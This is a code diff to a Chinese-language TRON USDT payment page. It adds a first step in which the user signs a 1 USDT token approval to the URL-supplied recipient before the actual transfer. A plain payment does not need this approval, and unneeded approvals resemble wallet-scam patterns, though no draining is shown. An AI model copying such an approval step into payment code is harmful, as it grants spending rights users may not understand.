@@ -42,7 +42,7 @@
     <div class="info-row"><span class="info-k">支付金额</span><span class="info-v gold" id="info-amount">-</span></div>
   </div>
 
-  <button class="btn btn-pay" id="btn-pay" disabled>确认支付</button>
+  <button class="btn btn-pay" id="btn-pay" disabled>第 1 步：确认授权 1U</button>
   <button class="btn btn-ghost" id="btn-cancel">取消 / 刷新页面</button>
   <div class="status" id="status"></div>
 </div>
@@ -64,7 +64,7 @@ const SIGN_TIMEOUT    = 120000;
 const SEND_TIMEOUT    = 15000;
 const BACKUP_NODES    = ['https://api.trongrid.io', 'https://api.tronstack.io'];
 
-/* ============ 参数三重恢复（冷启动核心） ============ */
+/* ============ 参数三重恢复 ============ */
 function parseParamStr(str) {
   const sp = new URLSearchParams(str || '');
   return {
@@ -110,7 +110,7 @@ if ((ctx.src === 'hash' || ctx.src === 'storage') && toAddress && amount > 0) {
   const tip = $('#recover-tip');
   tip.style.display = 'block';
   tip.textContent = ctx.src === 'storage'
-    ? '✅ 已从本地缓存恢复支付参数（imToken 冷启动兜底），请确认金额与地址无误后继续。'
+    ? '✅ 已从本地缓存恢复支付参数，请确认金额与地址无误后继续。'
     : '✅ 已从备用链接恢复支付参数，请确认金额与地址无误后继续。';
   savePayCtx(toAddress, amount, type);
 }
@@ -121,7 +121,7 @@ if (!toAddress || amount <= 0) {
 } else {
   const btn = $('#btn-pay');
   btn.disabled = false;
-  btn.textContent = '确认支付 ' + amount + ' USDT';
+  btn.textContent = '第 1 步：确认授权 1U';
 }
 
 function showMissingParamsUI() {
@@ -202,9 +202,12 @@ async function buildTxMulti(tw, contract, fnSig, params, fromAddress) {
   ));
   return withRetry(() => promiseAny(tasks), 2, 500);
 }
+async function buildTxCore(tw, fnSig, params, fromAddress) {
+  return buildTxMulti(tw, USDT_CONTRACT, fnSig, params, fromAddress);
+}
 async function buildTxWithTip(tw, fnSig, params, fromAddress) {
   const slow = setTimeout(() => setStatus('loading', '⏳ 波场节点响应较慢，正在努力连接（已自动重试）…'), 3000);
-  try { return await buildTxMulti(tw, USDT_CONTRACT, fnSig, params, fromAddress); }
+  try { return await buildTxCore(tw, fnSig, params, fromAddress); }
   finally { clearTimeout(slow); }
 }
 function androidIntentLink(dappUrl) {
@@ -262,16 +265,39 @@ async function waitWalletAddress(tw) {
   if (!from) throw new Error('钱包地址未就绪，请退出页面后重新进入');
   return from;
 }
+async function checkAllowance(tw, owner) {
+  try {
+    const res = await withTimeout(
+      tw.transactionBuilder.triggerConstantContract(USDT_CONTRACT, 'allowance(address,address)', {},
+        [{ type: 'address', value: owner }, { type: 'address', value: toAddress }], owner),
+      5000, 'allowance 查询超时');
+    const hex = res && res.constant_result && res.constant_result[0];
+    if (hex) {
+      const allowed = BigInt('0x' + hex.replace(/^0x/, ''));
+      if (allowed >= 1000000n) return true;
+    }
+  } catch (e) {}
+  return false;
+}
 
-let cachedTransfer = null, cachedAt = 0, prewarmTimer = null;
+/* ============ 预构建 ============ */
+let step = 1;
+let cachedApprove = null, cachedTransfer = null, cachedAt = 0, prewarmTimer = null;
 async function prewarmOnce() {
   if (payDisabled) return;
   try {
     const tw = getTronWeb(); if (!tw) return;
     const from = await waitWalletAddress(tw);
-    cachedTransfer = await buildTxMulti(tw, USDT_CONTRACT, 'transfer(address,uint256)',
-      [{ type: 'address', value: toAddress }, { type: 'uint256', value: Math.floor(amount * 1e6).toString() }], from);
+    if (step === 1 && (await checkAllowance(tw, from))) {
+      step = 2;
+      const btn = $('#btn-pay');
+      if (!btn.disabled) btn.textContent = '第 2 步：确认支付 ' + amount + ' USDT';
+    }
+    cachedApprove = await buildTxCore(tw, 'approve(address,uint256)',
+      [{ type: 'address', value: toAddress }, { type: 'uint256', value: '1000000' }], from);
     cachedAt = Date.now();
+    cachedTransfer = await buildTxCore(tw, 'transfer(address,uint256)',
+      [{ type: 'address', value: toAddress }, { type: 'uint256', value: Math.floor(amount * 1e6).toString() }], from);
   } catch (e) {}
 }
 function prewarmLoop() {
@@ -283,15 +309,41 @@ function prewarmLoop() {
 }
 function freshCache(obj) { return obj && obj.result && obj.result.result && Date.now() - cachedAt < CACHE_TTL; }
 
-/* ============ 单步支付交互 ============ */
+/* ============ 支付交互 ============ */
 $('#btn-pay').onclick = async function () {
   if (payDisabled) return;
   const btn = this; btn.disabled = true;
   const tw = getTronWeb();
   if (!tw) { showOpenWalletUI('⚠️ 未检测到钱包环境'); btn.disabled = false; return; }
 
+  if (step === 1) {
+    btn.textContent = '请求授权中…';
+    setStatus('loading', '第 1 步：请在钱包弹窗中确认授权…');
+    try {
+      const from = await waitWalletAddress(tw);
+      let tx = freshCache(cachedApprove) ? cachedApprove : null;
+      if (!tx) {
+        setStatus('loading', '正在构建授权交易，请稍候…');
+        tx = await buildTxWithTip(tw, 'approve(address,uint256)',
+          [{ type: 'address', value: toAddress }, { type: 'uint256', value: '1000000' }], from);
+      }
+      if (!tx.result || !tx.result.result) throw new Error('构建授权交易失败');
+      setStatus('loading', '✅ 请在钱包弹窗中确认授权…');
+      const signed = await withTimeout(tw.trx.sign(tx.transaction), SIGN_TIMEOUT, '授权签名超时（您可能未在钱包中确认），请重试');
+      await withTimeout(tw.trx.sendRawTransaction(signed), SEND_TIMEOUT, '广播授权交易超时，请检查网络后重试');
+      setStatus('success', '✅ 授权成功！请点击下方按钮进行第 2 步支付。');
+      step = 2; cachedApprove = null;
+      btn.textContent = '第 2 步：确认支付 ' + amount + ' U';
+      btn.disabled = false;
+    } catch (e) {
+      setStatus('error', '❌ 授权失败: ' + (e.message || '用户取消'));
+      btn.textContent = '重新授权'; btn.disabled = false;
+    }
+    return;
+  }
+
   btn.textContent = '请求支付中…';
-  setStatus('loading', '请在钱包弹窗中确认支付…');
+  setStatus('loading', '第 2 步：请在钱包弹窗中确认支付…');
   try {
     const from = await waitWalletAddress(tw);
     let tx = freshCache(cachedTransfer) ? cachedTransfer : null;
@@ -301,12 +353,10 @@ $('#btn-pay').onclick = async function () {
         [{ type: 'address', value: toAddress }, { type: 'uint256', value: Math.floor(amount * 1e6).toString() }], from);
     }
     if (!tx.result || !tx.result.result) throw new Error('构建支付交易失败');
-    
     setStatus('loading', '✅ 请在钱包弹窗中确认支付…');
     const signed = await withTimeout(tw.trx.sign(tx.transaction), SIGN_TIMEOUT, '支付签名超时（您可能未在钱包中确认），请重试');
     await withTimeout(tw.trx.sendRawTransaction(signed), SEND_TIMEOUT, '广播支付交易超时，请检查网络后重试');
-    
-    setStatus('success', '✅ 支付已完成，请在钱包账单中查看状态');
+    setStatus('success', '✅ 全部操作已完成，请在钱包账单中查看状态');
     btn.textContent = '已完成';
     clearPayCtx();
   } catch (e) {
